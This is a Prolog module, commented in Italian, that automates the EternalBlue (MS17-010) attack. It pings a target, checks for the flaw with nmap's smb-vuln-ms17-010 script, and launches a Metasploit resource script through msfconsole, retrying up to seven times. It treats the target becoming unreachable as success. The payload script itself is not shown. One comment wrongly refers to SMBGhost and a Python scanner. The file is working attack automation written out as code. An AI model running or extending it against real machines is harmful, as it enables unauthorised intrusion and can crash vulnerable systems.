/** <eternalblue.pl> Utilità per l'exploit EternalBlue
 *
 *  Questo modulo introduce diversi predicati di utilità 
 *  per il controllo della vulnerabilità EternalBlue e
 *  l'esecuzione dell'exploit relativo.
 *
 *  @author Mauro Andreolini
 *  @version 0.1
 */
:- module(eternalblue, [
    target_alive/1,
    check_vuln_eternalblue/2,
    exploit_eternalblue/2,
    exploit_with_retry/5
]).

:- use_module(utils/command_runner).

%% target_alive(+IP) is semidet.
%  Verifica se il target è raggiungibile tramite ping.
target_alive(IP) :-
    run_command("ping", ["-c", "1", "-W", "2", IP], False, False, _, _, ExitCode),
    ExitCode == 0.

% Percorsi degli script
exploit_script("/home/kali/working_directory/eternalblue.rc").

%% check_vuln(+IP:string, +Port:number, +InputPipe:string, +OutputPipe:string) is semidet
%
%  Il predicato check_vuln/3 è un wrapper dello
%  script Python 3 memorizzato in scanner_script/1 che
%  verifica la presenza della vulnerabilità SMBGhost.
%
%  @param IP L'indirizzo IP del target.
%  @param Port La porta TCP del target.
%
check_vuln_eternalblue(Target, Port) :-
	run_command(
		"nmap",
		[ "--script", "smb-vuln-ms17-010", "-p", Port, Target ],
		False,
		False,
		Stdout,
		_,
		ExitCode),
	ExitCode = 0,
	sub_string(Stdout, _, _, _, "VULNERABLE").


%% exploit_with_retry(+Target, +SMBPort, +MaxAttempts, +Delay, +CurrentAttempt) is det.
%  Esegue l’exploit e controlla se il target è ancora attivo.
%  In caso affermativo, ritenta fino a MaxAttempts.
exploit_with_retry(Target, SMBPort, Max, Delay, Attempt) :-
    format("Tentativo ~w di ~w: esecuzione exploit...~n", [Attempt, Max]),
    exploit_script(Script),
    run_command("msfconsole",
        [ "-r", Script ],
        False,
        False,
        _,
        _,
        ExitCode),  % Ignoriamo l'exit code

    sleep(15),

    (
    \+ target_alive(Target) ->
        format("Exploit fallito. Riprovo...~n", []),
        flush_output,
        sleep(Delay),
        NextAttempt is Attempt + 1,
        exploit_with_retry(Target, SMBPort, Max, Delay, NextAttempt)
    ;
    (
        format("Successo exploit.~n", []),
        flush_output
    )
    ).



%% exploit_eternalblue(+Target, +SMBPort) is det.
%  Lancia l'exploit e ritenta se il target resta attivo.
exploit_eternalblue(Target, SMBPort) :-
    format("Tentativo di exploit~n", []),
	flush_output,
    MaxAttempts = 7,              % Numero massimo di tentativi
    RetryDelaySeconds = 20,       % Tempo di attesa tra i tentativi (secondi)
    exploit_with_retry(Target, SMBPort, MaxAttempts, RetryDelaySeconds, 1).
